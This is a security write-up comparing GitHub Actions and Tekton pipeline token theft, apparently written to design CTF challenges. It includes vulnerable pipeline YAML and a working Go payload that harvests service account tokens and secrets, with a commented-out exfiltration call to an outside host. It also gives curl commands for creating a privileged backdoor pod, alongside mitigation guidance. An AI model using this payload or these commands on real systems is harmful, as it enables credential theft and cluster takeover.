# Attack Analysis: Token Theft via Poisoned Scripts
## GitHub Actions vs Tekton Pipelines

This document analyzes the attack described in the StepSecurity article and demonstrates how it can be replicated (and potentially made more dangerous) using Tekton Pipelines.

## Original GitHub Actions Attack (avelino/awesome-go)

### Attack Vector
**Vulnerability:** "Pwn Request" - a `pull_request_target` workflow that executes untrusted fork code with repository permissions.

### Attack Flow
1. Attacker identifies a workflow triggered on `pull_request_target`
2. Workflow checks out attacker's fork code (`actions/checkout@v4` with PR head SHA)
3. Workflow executes Go scripts from the PR (`go run ./.github/scripts/check-quality/`)
4. Attacker injects malicious `init()` function in Go code (executes before `main()`)
5. Malicious payload exfiltrates `GITHUB_TOKEN` to external server
6. Token has `contents: write` and `pull-requests: write` permissions
7. Attacker can now modify repo, create PRs, access private repo data

### Key Enablers
- `pull_request_target` trigger (grants target repo permissions to fork code)
- Automatic checkout of untrusted code
- Execution of code from the PR
- Powerful token with write permissions

---

## Tekton Pipelines Equivalent Attack

### Why Tekton Is MORE Dangerous

| Aspect | GitHub Actions | Tekton Pipelines |
|--------|----------------|------------------|
| **Permission Model** | Scoped `GITHUB_TOKEN` with specific permissions | Kubernetes ServiceAccount with RBAC - potentially cluster-wide access |
| **Credential Access** | Limited to `GITHUB_TOKEN` | Can access Kubernetes Secrets, ConfigMaps, and cluster resources |
| **Blast Radius** | Limited to repository/org | Can potentially compromise entire cluster |
| **Secret Exposure** | Environment variables only | File-mounted secrets, environment vars, and API access |
| **Network Access** | Restricted by runner network | Full cluster networking, can attack internal services |
| **Persistence** | Ephemeral runners | Can create persistent resources (pods, secrets, etc.) |
| **Audit Trail** | GitHub audit logs | Depends on cluster logging configuration |

### Tekton Attack Vector: EventListener Exploitation

**Vulnerability:** A Tekton EventListener configured to trigger pipelines on PR events that execute untrusted code.

### Attack Components

#### 1. Vulnerable EventListener Configuration
Triggers a pipeline when a PR is opened/updated, similar to `pull_request_target`:
```yaml
apiVersion: triggers.tekton.dev/v1beta1
kind: EventListener
metadata:
  name: pr-quality-check-listener
spec:
  serviceAccountName: tekton-triggers-sa  # <- Has cluster permissions
  triggers:
    - name: pull-request-quality-check
      interceptors:
        - ref:
            name: github
          params:
            - name: eventTypes
              value: ["pull_request"]
            - name: secretRef
              secretName: github-webhook-secret
      bindings:
        - ref: pr-quality-binding
      template:
        ref: pr-quality-template
```

#### 2. Vulnerable TriggerBinding
Extracts PR information, including attacker-controlled fork URL:
```yaml
apiVersion: triggers.tekton.dev/v1beta1
kind: TriggerBinding
metadata:
  name: pr-quality-binding
spec:
  params:
    - name: pr-repo-url
      value: $(body.pull_request.head.repo.clone_url)  # <- Attacker's fork!
    - name: pr-sha
      value: $(body.pull_request.head.sha)              # <- Attacker's code!
    - name: pr-number
      value: $(body.number)
```

#### 3. Vulnerable Pipeline
Checks out and executes untrusted code:
```yaml
apiVersion: tekton.dev/v1beta1
kind: Pipeline
metadata:
  name: pr-quality-check-pipeline
spec:
  params:
    - name: pr-repo-url
    - name: pr-sha
    - name: pr-number
  workspaces:
    - name: source
  tasks:
    - name: clone-pr-code
      taskRef:
        name: git-clone
      params:
        - name: url
          value: $(params.pr-repo-url)     # <- Clones attacker's fork
        - name: revision
          value: $(params.pr-sha)          # <- Attacker's code
      workspaces:
        - name: output
          workspace: source

    - name: run-quality-checks
      taskRef:
        name: quality-check-task
      runAfter:
        - clone-pr-code
      workspaces:
        - name: source
          workspace: source
```

#### 4. Vulnerable Task (Executes Untrusted Code)
```yaml
apiVersion: tekton.dev/v1beta1
kind: Task
metadata:
  name: quality-check-task
spec:
  workspaces:
    - name: source
  steps:
    - name: run-quality-script
      image: golang:1.21
      workingDir: $(workspaces.source.path)
      script: |
        #!/bin/bash
        set -e

        # Run the quality check script from the PR
        # THIS IS THE VULNERABILITY - executing untrusted code!
        cd scripts/quality-check
        go run .  # <- Executes attacker's code with cluster permissions!
```

### Attack Payload: Malicious Go Script

The attacker submits a PR with this malicious `scripts/quality-check/main.go`:

```go
package main

import (
    "fmt"
    "io/ioutil"
    "net/http"
    "os"
    "strings"
)

// MALICIOUS: init() runs before main(), making it perfect for stealth
func init() {
    exfiltrateSecrets()
}

func exfiltrateSecrets() {
    // Collect Kubernetes service account token
    saToken, _ := ioutil.ReadFile("/var/run/secrets/kubernetes.io/serviceaccount/token")

    // Collect environment variables (may contain secrets)
    envVars := os.Environ()

    // Collect mounted secrets from common locations
    secrets := collectSecrets()

    // Prepare payload
    payload := fmt.Sprintf(
        "TOKEN=%s\nENV=%s\nSECRETS=%s\nPOD=%s\nNAMESPACE=%s",
        string(saToken),
        strings.Join(envVars, "\n"),
        strings.Join(secrets, "\n"),
        os.Getenv("HOSTNAME"),
        readFile("/var/run/secrets/kubernetes.io/serviceaccount/namespace"),
    )

    // Exfiltrate to attacker's server
    // http.Post("http://recv.hackmoltrepeat.com/tekton",
    //    "text/plain",
    //    strings.NewReader(payload))
    fmt.Printf("%s", payload)

}

func collectSecrets() []string {
    secrets := []string{}
    secretPaths := []string{
        "/workspace/secrets",
        "/tekton/secrets",
        "/etc/secrets",
    }

    for _, path := range secretPaths {
        files, err := ioutil.ReadDir(path)
        if err != nil {
            continue
        }
        for _, file := range files {
            if !file.IsDir() {
                content, _ := ioutil.ReadFile(path + "/" + file.Name())
                secrets = append(secrets, fmt.Sprintf("%s/%s: %s", path, file.Name(), string(content)))
            }
        }
    }
    return secrets
}

func readFile(path string) string {
    data, _ := ioutil.ReadFile(path)
    return string(data)
}

func main() {
    // Legitimate-looking quality check code to avoid suspicion
    fmt.Println("Running quality checks...")
    fmt.Println("✓ Code formatting: PASS")
    fmt.Println("✓ Linting: PASS")
    fmt.Println("✓ Security scan: PASS")
    fmt.Println("Quality check completed successfully!")
}
```

### What the Attacker Gets

With the exfiltrated Kubernetes service account token, the attacker can:

1. **Access the Kubernetes API** with whatever permissions the service account has
2. **Read secrets** from the namespace (potentially cluster-wide depending on RBAC)
3. **Create/modify resources** (pods, deployments, configmaps, etc.)
4. **Pivot to other namespaces** if the service account has cross-namespace permissions
5. **Deploy cryptocurrency miners** or other malicious workloads
6. **Establish persistence** by creating privileged pods or modifying existing deployments
7. **Access container registries** if registry credentials are in secrets
8. **Compromise CI/CD pipelines** by modifying other Tekton resources

### Example of What Attacker Can Do With Token

```bash
# Using the stolen token
export KUBE_TOKEN="<exfiltrated-token>"
export KUBE_API="https://kubernetes.default.svc"

# List all secrets in the namespace
curl -H "Authorization: Bearer $KUBE_TOKEN" \
     -k $KUBE_API/api/v1/namespaces/tekton-pipelines/secrets

# Create a malicious pod with host access
curl -H "Authorization: Bearer $KUBE_TOKEN" \
     -H "Content-Type: application/json" \
     -k $KUBE_API/api/v1/namespaces/default/pods \
     -X POST -d '{
       "apiVersion": "v1",
       "kind": "Pod",
       "metadata": {"name": "backdoor"},
       "spec": {
         "hostNetwork": true,
         "hostPID": true,
         "containers": [{
           "name": "backdoor",
           "image": "alpine",
           "command": ["/bin/sh", "-c", "sleep 3600"],
           "securityContext": {"privileged": true}
         }]
       }
     }'

# Modify existing pipeline to add backdoor
curl -H "Authorization: Bearer $KUBE_TOKEN" \
     -k $KUBE_API/apis/tekton.dev/v1beta1/namespaces/default/pipelines/build-pipeline \
     -X PATCH ...
```

---

## Comparison: Attack Surface

### GitHub Actions
- **Scope:** Repository/Organization
- **Credentials:** `GITHUB_TOKEN` with defined scopes
- **Lateral Movement:** Limited to GitHub API
- **Detection:** GitHub audit logs, workflow logs

### Tekton Pipelines
- **Scope:** Kubernetes cluster
- **Credentials:** ServiceAccount token with RBAC permissions
- **Lateral Movement:** Entire cluster, internal services, other namespaces
- **Detection:** Depends on cluster audit logging configuration

---

## CTF Challenge Design

For a CTF environment, this creates an excellent learning opportunity:

### Challenge 1: Basic Token Theft
- Participant discovers vulnerable EventListener
- Crafts malicious PR with Go `init()` function
- Exfiltrates service account token
- **Flag:** Hidden in a Kubernetes secret accessible with stolen token

### Challenge 2: Privilege Escalation
- Stolen token has limited permissions
- Participant must find and exploit misconfigured RBAC
- **Flag:** Accessible only with cluster-admin permissions

### Challenge 3: Persistence
- Participant must maintain access after pipeline completes
- Create persistent backdoor using stolen credentials
- **Flag:** Obtained after maintaining access for X minutes

### Challenge 4: Detection Evasion
- All previous attacks are logged
- Participant must exfiltrate secrets without triggering alerts
- **Flag:** Retrieved while staying under detection threshold

---

## Mitigation Strategies

### For Tekton Pipelines

1. **Never execute untrusted code directly**
   - Use separate pipelines for PR validation vs. trusted builds
   - Run PR pipelines in sandboxed environments

2. **Use minimal RBAC permissions**
   - Create dedicated service accounts per pipeline
   - Follow principle of least privilege
   - Use `Role` instead of `ClusterRole` when possible

3. **Implement network policies**
   - Restrict egress traffic from pipeline pods
   - Block access to metadata APIs
   - Whitelist only necessary external endpoints

4. **Use separate namespaces**
   - Isolate untrusted PR pipelines in restricted namespaces
   - Use `NetworkPolicy` to prevent cross-namespace access

5. **Enable audit logging**
   - Log all API calls from pipeline service accounts
   - Monitor for unusual secret access patterns
   - Alert on privilege escalation attempts

6. **Use workload identity where available**
   - Avoid long-lived static credentials
   - Use short-lived tokens with automatic rotation

7. **Static analysis of pipeline definitions**
   - Scan EventListeners for unsafe trigger patterns
   - Detect pipelines that clone from PR head
   - Flag tasks that execute arbitrary code

### Example: Secure Pipeline Pattern

```yaml
# Separate pipeline for untrusted PR validation
apiVersion: tekton.dev/v1beta1
kind: Pipeline
metadata:
  name: pr-validation-pipeline
  namespace: untrusted-prs  # <- Isolated namespace
spec:
  params:
    - name: pr-repo-url
    - name: pr-sha
  workspaces:
    - name: source
  tasks:
    - name: clone-pr
      taskRef:
        name: git-clone
      params:
        - name: url
          value: $(params.pr-repo-url)
        - name: revision
          value: $(params.pr-sha)
      workspaces:
        - name: output
          workspace: source

    - name: static-analysis
      taskRef:
        name: run-in-sandbox  # <- Sandboxed execution
      params:
        - name: image
          value: golangci-lint:latest
        - name: command
          value: ["golangci-lint", "run", "--timeout", "5m"]
      workspaces:
        - name: source
          workspace: source
---
# ServiceAccount with minimal permissions
apiVersion: v1
kind: ServiceAccount
metadata:
  name: pr-validation-sa
  namespace: untrusted-prs
---
# Minimal RBAC - NO secret access
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  name: pr-validation-role
  namespace: untrusted-prs
rules:
  - apiGroups: [""]
    resources: ["pods", "pods/log"]
    verbs: ["get", "list"]
  # NO secrets access
  # NO other namespaces
---
# Network policy - block egress except allowed
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: pr-validation-netpol
  namespace: untrusted-prs
spec:
  podSelector:
    matchLabels:
      tekton.dev/pipeline: pr-validation-pipeline
  policyTypes:
    - Egress
  egress:
    # Allow DNS
    - to:
        - namespaceSelector:
            matchLabels:
              name: kube-system
      ports:
        - protocol: UDP
          port: 53
    # Block all other egress - no exfiltration!
```

---

## Conclusion

**Yes, this attack is absolutely possible with Tekton Pipelines**, and in many ways it's MORE dangerous than the GitHub Actions equivalent because:

1. The attacker gets Kubernetes cluster access, not just repo access
2. The blast radius is much larger (entire cluster vs. single repository)
3. Lateral movement opportunities are extensive
4. Detection is harder without proper audit logging
5. Persistence mechanisms are more powerful

This makes it an excellent CTF scenario for teaching:
- Supply chain security
- Kubernetes security
- RBAC and least privilege
- Network policies
- Secure CI/CD pipeline design
